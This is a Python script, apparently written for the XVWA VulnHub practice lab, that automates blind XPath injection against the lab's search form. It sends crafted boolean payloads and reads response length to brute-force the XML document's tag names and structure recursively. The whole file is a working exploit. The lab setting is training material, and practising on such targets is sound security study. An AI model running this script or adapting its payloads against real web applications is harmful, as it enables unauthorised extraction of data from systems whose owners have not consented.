#!/usr/bin/python3
# https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/

from pwn import *
import requests, time, sys, pdb, string, signal

# GLOBAL VARIABLES
URL = "http://172.16.186.129/xvwa/vulnerabilities/xpath/"
CHARS = string.ascii_letters

def def_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

def get_request(query):
    data = {
        "search": "%s" % query,
        "submit": ""
    }
    r = requests.post(URL, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
    return len(str(r.text))

def get_tag_count(searchterm):
    tagcount = 0
    while True:
        query = "1' and count(/*%s)<='%d" % (searchterm, tagcount)
        # pdb.set_trace()
        if get_request(query) > 9000:
            if not tagcount:
                return tagcount
            return tagcount
        tagcount += 1

def get_tag_length(searchterm):
    keylength = 0
    while True:
        keylength += 1
        query = "1' and string-length(name(/*%s))='%d" % (searchterm, keylength)
        if get_request(query) > 9000:
            return keylength

def get_tag_name(keylength, searchterm):
    keyname = ""
    for pos in range(1, keylength + 1):
        for char in CHARS:
            query = "1' and substring(name(/*%s),%d,1)='%s" % (searchterm, pos, char)
            if get_request(query) > 9000:
                keyname += char
    return keyname

def get_recursively(searchterm = ""): 
    missingtag = get_tag_count(searchterm)
    length = get_tag_length(searchterm[:-2])
    name = get_tag_name(length, searchterm[:-2])
    if searchterm:
        log.info("Position: /*%s, found tag %s" % (searchterm, name))
    if missingtag == 0:
        return
    for tagcount in range(1, missingtag + 1):
        newterm = "[%d]/*" % tagcount
        newsearch = searchterm + newterm
        get_recursively(newsearch)
    return

def xpath_injection():
    p1 = log.progress("Starting bruteforce for tags")
    time.sleep(2)
    print()
    get_recursively()
    time.sleep(2)
    p1.status("Bruteforce complete")
    p1.success("Bruteforce complete")
    print()
    log.info("Bruteforce complete")
    time.sleep(2)
    
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    xpath_injection()
